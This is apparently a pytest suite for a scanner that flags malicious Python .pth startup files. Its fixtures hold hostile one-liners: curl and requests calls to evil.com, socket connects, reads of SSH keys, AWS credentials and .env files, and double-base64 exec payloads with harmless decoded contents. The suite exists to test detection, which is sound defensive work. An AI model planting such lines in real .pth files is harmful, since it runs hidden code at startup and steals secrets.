"""Tests for the .pth file supply chain scanner.

Covers:
  - Clean .pth files (path-only, no executable content)
  - Known-good allowlisted files (distutils-precedence, editable installs)
  - CRITICAL patterns: base64 decode, subprocess, os.system, eval, network calls
  - Litellm-style double-encoded base64 payload (supply chain attack fixture)
  - Simple legitimate import (WARNING)
  - Empty .pth file (skip / no findings)
  - Binary content (CRITICAL)
  - Oversized file (CRITICAL)
  - Permission errors (WARNING)
  - Allowlist verification
  - Site-packages directory discovery
  - PthScanResult properties (has_critical, has_warning)
  - Output format helpers (markdown section, SARIF entries)
"""

from __future__ import annotations

import os
from pathlib import Path

import pytest

from agentward.scan.pth_scanner import (
    PthFinding,
    PthScanResult,
    _analyze_pth_file,
    _is_allowlisted,
    scan_pth_files,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _write_pth(tmp_path: Path, name: str, content: str) -> Path:
    """Write a .pth file with the given content and return its path."""
    p = tmp_path / name
    p.write_text(content, encoding="utf-8")
    return p


# ---------------------------------------------------------------------------
# PthScanResult property tests
# ---------------------------------------------------------------------------


def test_pth_scan_result_empty():
    r = PthScanResult()
    assert not r.has_critical
    assert not r.has_warning
    assert r.files_scanned == 0


def test_pth_scan_result_has_critical():
    r = PthScanResult(findings=[
        PthFinding(severity="CRITICAL", file="x.pth", line_number=1, pattern="eval_exec", evidence="eval(x)", description="d"),
    ])
    assert r.has_critical
    assert not r.has_warning  # no WARNING findings


def test_pth_scan_result_has_warning():
    r = PthScanResult(findings=[
        PthFinding(severity="WARNING", file="x.pth", line_number=1, pattern="executable_import", evidence="import foo", description="d"),
    ])
    assert not r.has_critical
    assert r.has_warning


def test_pth_scan_result_mixed_severity():
    r = PthScanResult(findings=[
        PthFinding(severity="CRITICAL", file="a.pth", line_number=1, pattern="eval_exec", evidence="eval(x)", description="d"),
        PthFinding(severity="WARNING", file="b.pth", line_number=2, pattern="executable_import", evidence="import foo", description="d"),
    ])
    assert r.has_critical
    assert r.has_warning


# ---------------------------------------------------------------------------
# Empty .pth file — no findings
# ---------------------------------------------------------------------------


def test_empty_pth_file(tmp_path):
    p = _write_pth(tmp_path, "empty.pth", "")
    findings = _analyze_pth_file(p)
    assert findings == []


def test_blank_lines_and_comments_only(tmp_path):
    p = _write_pth(tmp_path, "comments.pth", "# comment\n\n  \n# another\n")
    findings = _analyze_pth_file(p)
    assert findings == []


# ---------------------------------------------------------------------------
# Path-only .pth files — no executable content → no findings
# ---------------------------------------------------------------------------


def test_path_only_pth(tmp_path):
    p = _write_pth(tmp_path, "paths.pth", "/usr/local/lib/python3.11/site-packages\n/opt/conda/lib\n")
    findings = _analyze_pth_file(p)
    assert findings == []


def test_path_only_with_existing_paths(tmp_path):
    """Paths that exist — still no findings (path-only lines are not executable)."""
    p = _write_pth(tmp_path, "real_paths.pth", str(tmp_path) + "\n")
    findings = _analyze_pth_file(p)
    assert findings == []


# ---------------------------------------------------------------------------
# Allowlisted files — known-good
# ---------------------------------------------------------------------------


def test_allowlisted_distutils_precedence(tmp_path):
    """distutils-precedence.pth with the exact known-good import."""
    p = _write_pth(tmp_path, "distutils-precedence.pth", "import _distutils_hack\n")
    findings = _analyze_pth_file(p)
    assert findings == [], f"Expected no findings, got {findings}"


def test_allowlisted_distutils_precedence_no_import(tmp_path):
    """distutils-precedence.pth with NO executable lines — also OK."""
    p = _write_pth(tmp_path, "distutils-precedence.pth", "/usr/lib/python3/dist-packages\n")
    findings = _analyze_pth_file(p)
    assert findings == []


def test_allowlisted_editable_install(tmp_path):
    """__editable__*.pth files are always safe (editable installs)."""
    p = _write_pth(tmp_path, "__editable__mypackage-0.1.pth", "import __editable__mypackage\n")
    findings = _analyze_pth_file(p)
    assert findings == []


def test_allowlisted_editable_by_substring(tmp_path):
    """Files with __editable__ in name are allowlisted regardless of content."""
    p = _write_pth(tmp_path, "__editable__.myproj-1.0.pth", "/some/path\n")
    findings = _analyze_pth_file(p)
    assert findings == []


def test_allowlisted_nspkg_by_suffix(tmp_path):
    """-nspkg.pth files are allowlisted (namespace packages)."""
    p = _write_pth(tmp_path, "somepackage-nspkg.pth", "/some/path\n")
    findings = _analyze_pth_file(p)
    assert findings == []


def test_allowlisted_pytest_enabler(tmp_path):
    """pytest-enabler.pth with known-good content."""
    p = _write_pth(tmp_path, "pytest-enabler.pth", "import pytest_enabler\n")
    findings = _analyze_pth_file(p)
    assert findings == []


def test_allowlist_bad_content_overrides(tmp_path):
    """Even a known-good filename triggers a finding if content doesn't match allowlist."""
    p = _write_pth(tmp_path, "distutils-precedence.pth", "import subprocess; subprocess.run(['id'])\n")
    findings = _analyze_pth_file(p)
    assert any(f.severity == "CRITICAL" for f in findings)


# ---------------------------------------------------------------------------
# WARNING: executable import lines not on allowlist
# ---------------------------------------------------------------------------


def test_simple_import_warning(tmp_path):
    """An import line in an unknown file gets a WARNING."""
    p = _write_pth(tmp_path, "somepackage.pth", "import somepackage\n")
    findings = _analyze_pth_file(p)
    assert len(findings) == 1
    assert findings[0].severity == "WARNING"
    assert findings[0].pattern == "executable_import"
    assert findings[0].line_number == 1


def test_multiple_import_warnings(tmp_path):
    """Multiple executable lines each get a WARNING."""
    p = _write_pth(tmp_path, "multi.pth", "import foo\nimport bar\n")
    findings = _analyze_pth_file(p)
    assert len(findings) == 2
    assert all(f.severity == "WARNING" for f in findings)
    assert findings[0].line_number == 1
    assert findings[1].line_number == 2


# ---------------------------------------------------------------------------
# CRITICAL: base64 decode patterns
# ---------------------------------------------------------------------------


def test_base64_decode_critical(tmp_path):
    """import line with b64decode triggers CRITICAL."""
    p = _write_pth(tmp_path, "malicious.pth", "import base64; base64.b64decode('cGF5bG9hZA==')\n")
    findings = _analyze_pth_file(p)
    assert any(f.severity == "CRITICAL" for f in findings)
    assert any("base64" in f.pattern for f in findings)


def test_double_base64_decode_critical(tmp_path):
    """Double base64 decode (litellm attack pattern) triggers CRITICAL with double_base64_decode rule."""
    # Simulated litellm_init.pth attack: double-encoded payload
    payload = "import base64; exec(base64.b64decode(base64.b64decode(b'Y29kZQ==')))"
    p = _write_pth(tmp_path, "litellm_init.pth", payload + "\n")
    findings = _analyze_pth_file(p)
    assert any(f.severity == "CRITICAL" for f in findings)
    assert any(f.pattern == "double_base64_decode" for f in findings)


def test_litellm_style_payload_fixture(tmp_path):
    """Full litellm supply chain attack fixture — must be detected as CRITICAL.

    The March 2026 litellm attack used a .pth file with an 'import' line
    containing double-encoded base64 to execute a payload at interpreter startup.
    """
    # Realistic payload structure (obfuscated, double-encoded)
    attack_line = (
        "import base64,sys;"
        "exec(base64.b64decode(base64.b64decode("
        "b'dGVzdF9wYXlsb2Fk'  # outer encoding\n"
        ")))\n"
    )
    p = _write_pth(tmp_path, "litellm_init.pth", attack_line)
    findings = _analyze_pth_file(p)
    critical = [f for f in findings if f.severity == "CRITICAL"]
    assert len(critical) >= 1, f"Expected CRITICAL finding, got {findings}"
    # Evidence should be present
    assert any(f.evidence for f in critical)


# ---------------------------------------------------------------------------
# CRITICAL: subprocess execution
# ---------------------------------------------------------------------------


def test_subprocess_popen_critical(tmp_path):
    p = _write_pth(tmp_path, "bad.pth", "import subprocess; subprocess.Popen(['curl', 'http://evil.com'])\n")
    findings = _analyze_pth_file(p)
    assert any(f.severity == "CRITICAL" and f.pattern == "subprocess_exec" for f in findings)


def test_subprocess_run_critical(tmp_path):
    p = _write_pth(tmp_path, "bad.pth", "import subprocess; subprocess.run(['id'])\n")
    findings = _analyze_pth_file(p)
    assert any(f.severity == "CRITICAL" for f in findings)


def test_subprocess_check_output_critical(tmp_path):
    p = _write_pth(tmp_path, "bad.pth", "import subprocess; subprocess.check_output('whoami')\n")
    findings = _analyze_pth_file(p)
    assert any(f.severity == "CRITICAL" for f in findings)


# ---------------------------------------------------------------------------
# CRITICAL: os execution
# ---------------------------------------------------------------------------


def test_os_system_critical(tmp_path):
    p = _write_pth(tmp_path, "bad.pth", "import os; os.system('id')\n")
    findings = _analyze_pth_file(p)
    assert any(f.severity == "CRITICAL" and f.pattern == "os_exec" for f in findings)


def test_os_popen_critical(tmp_path):
    p = _write_pth(tmp_path, "bad.pth", "import os; os.popen('id').read()\n")
    findings = _analyze_pth_file(p)
    assert any(f.severity == "CRITICAL" for f in findings)


# ---------------------------------------------------------------------------
# CRITICAL: eval / exec / compile
# ---------------------------------------------------------------------------


def test_eval_critical(tmp_path):
    p = _write_pth(tmp_path, "bad.pth", "import something; eval(something.get_code())\n")
    findings = _analyze_pth_file(p)
    assert any(f.severity == "CRITICAL" and f.pattern == "eval_exec" for f in findings)


def test_exec_critical(tmp_path):
    p = _write_pth(tmp_path, "bad.pth", "import something; exec(open('/tmp/x').read())\n")
    findings = _analyze_pth_file(p)
    assert any(f.severity == "CRITICAL" for f in findings)


def test_compile_critical(tmp_path):
    p = _write_pth(tmp_path, "bad.pth", "import something; compile(something, '<str>', 'exec')\n")
    findings = _analyze_pth_file(p)
    assert any(f.severity == "CRITICAL" for f in findings)


# ---------------------------------------------------------------------------
# CRITICAL: network calls
# ---------------------------------------------------------------------------


def test_urllib_network_critical(tmp_path):
    p = _write_pth(tmp_path, "bad.pth", "import urllib.request; urllib.request.urlopen('http://evil.com')\n")
    findings = _analyze_pth_file(p)
    assert any(f.severity == "CRITICAL" and f.pattern == "network_urllib" for f in findings)


def test_requests_network_critical(tmp_path):
    p = _write_pth(tmp_path, "bad.pth", "import requests; requests.get('http://evil.com/steal')\n")
    findings = _analyze_pth_file(p)
    assert any(f.severity == "CRITICAL" and f.pattern == "network_requests" for f in findings)


def test_http_client_critical(tmp_path):
    p = _write_pth(tmp_path, "bad.pth", "import http.client; conn = http.client.HTTPSConnection('evil.com')\n")
    findings = _analyze_pth_file(p)
    assert any(f.severity == "CRITICAL" for f in findings)


def test_socket_connect_critical(tmp_path):
    p = _write_pth(tmp_path, "bad.pth", "import socket; socket.socket().connect(('evil.com', 443))\n")
    findings = _analyze_pth_file(p)
    assert any(f.severity == "CRITICAL" for f in findings)


# ---------------------------------------------------------------------------
# CRITICAL: sensitive file reads
# ---------------------------------------------------------------------------


def test_ssh_key_read_critical(tmp_path):
    p = _write_pth(tmp_path, "bad.pth", "import builtins; open(os.path.expanduser('~/.ssh/id_rsa')).read()\n")
    findings = _analyze_pth_file(p)
    assert any(f.severity == "CRITICAL" and f.pattern == "sensitive_file_read" for f in findings)


def test_aws_credentials_read_critical(tmp_path):
    p = _write_pth(tmp_path, "bad.pth", "import os; open(os.path.expanduser('~/.aws/credentials')).read()\n")
    findings = _analyze_pth_file(p)
    assert any(f.severity == "CRITICAL" for f in findings)


def test_env_file_read_critical(tmp_path):
    p = _write_pth(tmp_path, "bad.pth", "import os; data = open('.env').read()\n")
    findings = _analyze_pth_file(p)
    assert any(f.severity == "CRITICAL" for f in findings)


# ---------------------------------------------------------------------------
# CRITICAL: binary content
# ---------------------------------------------------------------------------


def test_binary_content_critical(tmp_path):
    """Files with high non-printable byte content are CRITICAL."""
    p = tmp_path / "binary.pth"
    # Write binary content (NUL bytes, control chars)
    p.write_bytes(b"\x00\x01\x02\x03" * 50 + b"import os")
    findings = _analyze_pth_file(p)
    assert any(f.severity == "CRITICAL" and f.pattern == "binary_content" for f in findings)


def test_null_bytes_binary_critical(tmp_path):
    """Pure null bytes → binary content → CRITICAL."""
    p = tmp_path / "null.pth"
    p.write_bytes(b"\x00" * 100)
    findings = _analyze_pth_file(p)
    assert any(f.severity == "CRITICAL" for f in findings)


# ---------------------------------------------------------------------------
# CRITICAL: oversized file
# ---------------------------------------------------------------------------


def test_oversized_file_critical(tmp_path, monkeypatch):
    """Files >1MB are flagged CRITICAL without reading full content."""
    import agentward.scan.pth_scanner as pth_mod

    # Monkeypatch _MAX_FILE_SIZE to a small value for testing
    monkeypatch.setattr(pth_mod, "_MAX_FILE_SIZE", 10)
    p = _write_pth(tmp_path, "big.pth", "import os\n" * 5)  # >10 bytes
    findings = _analyze_pth_file(p)
    assert any(f.severity == "CRITICAL" and f.pattern == "oversized_file" for f in findings)


# ---------------------------------------------------------------------------
# Permission errors
# ---------------------------------------------------------------------------


def test_permission_denied_warning(tmp_path, monkeypatch):
    """Permission denied reading file → WARNING (not crash)."""
    p = _write_pth(tmp_path, "unreadable.pth", "import foo\n")

    original_read_bytes = Path.read_bytes

    def mock_read_bytes(self):
        if self.name == "unreadable.pth":
            raise PermissionError("Permission denied")
        return original_read_bytes(self)

    monkeypatch.setattr(Path, "read_bytes", mock_read_bytes)
    findings = _analyze_pth_file(p)
    assert any(f.severity == "WARNING" and f.pattern == "permission_denied" for f in findings)


# ---------------------------------------------------------------------------
# Evidence truncation
# ---------------------------------------------------------------------------


def test_evidence_truncated(tmp_path):
    """Very long lines have evidence truncated to 200 chars."""
    long_line = "import " + "a" * 500 + "\n"
    p = _write_pth(tmp_path, "long.pth", long_line)
    findings = _analyze_pth_file(p)
    assert findings
    assert len(findings[0].evidence) <= 200


# ---------------------------------------------------------------------------
# _is_allowlisted helper
# ---------------------------------------------------------------------------


def test_is_allowlisted_exact_match():
    assert _is_allowlisted("distutils-precedence.pth", [(1, "import _distutils_hack")])


def test_is_allowlisted_no_exec_lines():
    """Empty executable lines → allowlisted (path-only file)."""
    assert _is_allowlisted("distutils-precedence.pth", [])


def test_is_allowlisted_wrong_content():
    assert not _is_allowlisted("distutils-precedence.pth", [(1, "import subprocess")])


def test_is_allowlisted_unknown_file():
    assert not _is_allowlisted("someunknown.pth", [(1, "import something")])


def test_is_allowlisted_editable_substring():
    assert _is_allowlisted("__editable__mypackage-1.0.pth", [(1, "import __editable__mypackage")])


def test_is_allowlisted_nspkg_suffix():
    assert _is_allowlisted("ipython_genutils-nspkg.pth", [(1, "import foo")])


# ---------------------------------------------------------------------------
# scan_pth_files() integration test
# ---------------------------------------------------------------------------


def test_scan_pth_files_clean_dir(tmp_path):
    """Scanning a directory with only clean .pth files returns no critical findings."""
    _write_pth(tmp_path, "clean.pth", "/some/path\n")
    _write_pth(tmp_path, "distutils-precedence.pth", "import _distutils_hack\n")

    result = scan_pth_files(extra_dirs=[tmp_path])
    assert result.files_scanned >= 2
    assert not result.has_critical


def test_scan_pth_files_detects_malicious(tmp_path):
    """Scanning a directory with a malicious .pth file returns CRITICAL findings."""
    _write_pth(tmp_path, "malicious.pth", "import base64; exec(base64.b64decode(b'dGVzdA=='))\n")

    result = scan_pth_files(extra_dirs=[tmp_path])
    assert result.files_scanned >= 1
    assert result.has_critical


def test_scan_pth_files_returns_errors_on_bad_dir():
    """Scanning a non-existent directory doesn't crash — errors are collected."""
    result = scan_pth_files(extra_dirs=[Path("/nonexistent/path/that/does/not/exist")])
    # Should not raise; non-existent dirs are silently skipped
    assert isinstance(result, PthScanResult)


def test_scan_pth_files_multiple_dirs(tmp_path):
    """Results combine findings from all provided directories."""
    dir1 = tmp_path / "sp1"
    dir2 = tmp_path / "sp2"
    dir1.mkdir()
    dir2.mkdir()
    _write_pth(dir1, "a.pth", "import foo\n")
    _write_pth(dir2, "b.pth", "import subprocess; subprocess.Popen(['id'])\n")

    result = scan_pth_files(extra_dirs=[dir1, dir2])
    assert result.files_scanned >= 2
    assert result.has_critical
    assert result.has_warning


def test_scan_pth_files_site_packages_dirs_populated(tmp_path):
    """site_packages_dirs is populated even when scanning custom dirs."""
    result = scan_pth_files(extra_dirs=[tmp_path])
    assert isinstance(result.site_packages_dirs, list)


# ---------------------------------------------------------------------------
# Markdown report integration
# ---------------------------------------------------------------------------


def test_markdown_report_includes_pth_section():
    """generate_scan_markdown includes .pth section when pth_result is present."""
    from agentward.scan.pth_scanner import PthScanResult, PthFinding
    from agentward.scan.permissions import ScanResult
    from agentward.scan.report import generate_scan_markdown

    scan = ScanResult()
    scan.pth_result = PthScanResult(
        findings=[PthFinding(
            severity="CRITICAL",
            file="/usr/lib/python3/site-packages/malicious.pth",
            line_number=1,
            pattern="base64_decode",
            evidence="import base64; exec(base64.b64decode(...))",
            description="Base64 decoding in .pth startup code",
        )],
        files_scanned=5,
        site_packages_dirs=["/usr/lib/python3/site-packages"],
    )

    md = generate_scan_markdown(scan, [], chains=[])
    assert "Supply Chain" in md
    assert "pth" in md.lower() or ".pth" in md
    assert "CRITICAL" in md


def test_markdown_report_clean_pth_section():
    """generate_scan_markdown includes .pth section with no findings."""
    from agentward.scan.pth_scanner import PthScanResult
    from agentward.scan.permissions import ScanResult
    from agentward.scan.report import generate_scan_markdown

    scan = ScanResult()
    scan.pth_result = PthScanResult(files_scanned=3)

    md = generate_scan_markdown(scan, [], chains=[])
    assert "Supply Chain" in md
    assert "No suspicious" in md


def test_markdown_report_no_pth_section_when_none():
    """generate_scan_markdown has no .pth section when pth_result is None."""
    from agentward.scan.permissions import ScanResult
    from agentward.scan.report import generate_scan_markdown

    scan = ScanResult()
    # pth_result is None (not set)
    md = generate_scan_markdown(scan, [], chains=[])
    assert "Supply Chain: .pth" not in md


# ---------------------------------------------------------------------------
# SARIF report integration
# ---------------------------------------------------------------------------


def test_sarif_report_includes_pth_results():
    """generate_sarif includes .pth findings as SARIF results."""
    import json
    from agentward.scan.pth_scanner import PthScanResult, PthFinding
    from agentward.scan.permissions import ScanResult
    from agentward.scan.sarif_report import generate_sarif

    scan = ScanResult()
    scan.pth_result = PthScanResult(
        findings=[PthFinding(
            severity="CRITICAL",
            file="/usr/lib/python3/site-packages/malicious.pth",
            line_number=2,
            pattern="subprocess_exec",
            evidence="import subprocess; subprocess.Popen(['id'])",
            description="Subprocess execution at interpreter startup",
        )],
        files_scanned=1,
    )

    sarif_str = generate_sarif(scan, [], chains=[])
    sarif = json.loads(sarif_str)

    results = sarif["runs"][0]["results"]
    pth_results = [r for r in results if "pth" in r.get("ruleId", "")]
    assert len(pth_results) >= 1
    assert pth_results[0]["level"] == "error"
    assert pth_results[0]["locations"][0]["physicalLocation"]["region"]["startLine"] == 2


def test_sarif_report_no_pth_when_none():
    """generate_sarif has no pth rules/results when pth_result is None."""
    import json
    from agentward.scan.permissions import ScanResult
    from agentward.scan.sarif_report import generate_sarif

    scan = ScanResult()
    sarif_str = generate_sarif(scan, [], chains=[])
    sarif = json.loads(sarif_str)
    results = sarif["runs"][0]["results"]
    pth_results = [r for r in results if "pth" in r.get("ruleId", "")]
    assert pth_results == []


def test_sarif_report_ok_findings_excluded():
    """generate_sarif skips OK-severity pth findings."""
    import json
    from agentward.scan.pth_scanner import PthScanResult, PthFinding
    from agentward.scan.permissions import ScanResult
    from agentward.scan.sarif_report import generate_sarif

    scan = ScanResult()
    scan.pth_result = PthScanResult(
        findings=[PthFinding(
            severity="OK",
            file="/ok.pth",
            line_number=None,
            pattern="allowlisted",
            evidence="",
            description="OK",
        )],
        files_scanned=1,
    )

    sarif_str = generate_sarif(scan, [], chains=[])
    sarif = json.loads(sarif_str)
    results = sarif["runs"][0]["results"]
    pth_results = [r for r in results if "pth" in r.get("ruleId", "")]
    assert pth_results == []


# ---------------------------------------------------------------------------
# Line number tracking
# ---------------------------------------------------------------------------


def test_line_numbers_tracked_correctly(tmp_path):
    """Findings report the correct 1-based line number."""
    content = "# comment\n/path/to/lib\nimport evil_module\n"
    p = _write_pth(tmp_path, "linenum.pth", content)
    findings = _analyze_pth_file(p)
    assert any(f.line_number == 3 for f in findings)


def test_line_numbers_blank_lines_counted(tmp_path):
    """Blank lines count toward line numbers."""
    content = "\n\nimport bad_module\n"
    p = _write_pth(tmp_path, "linenum2.pth", content)
    findings = _analyze_pth_file(p)
    assert any(f.line_number == 3 for f in findings)
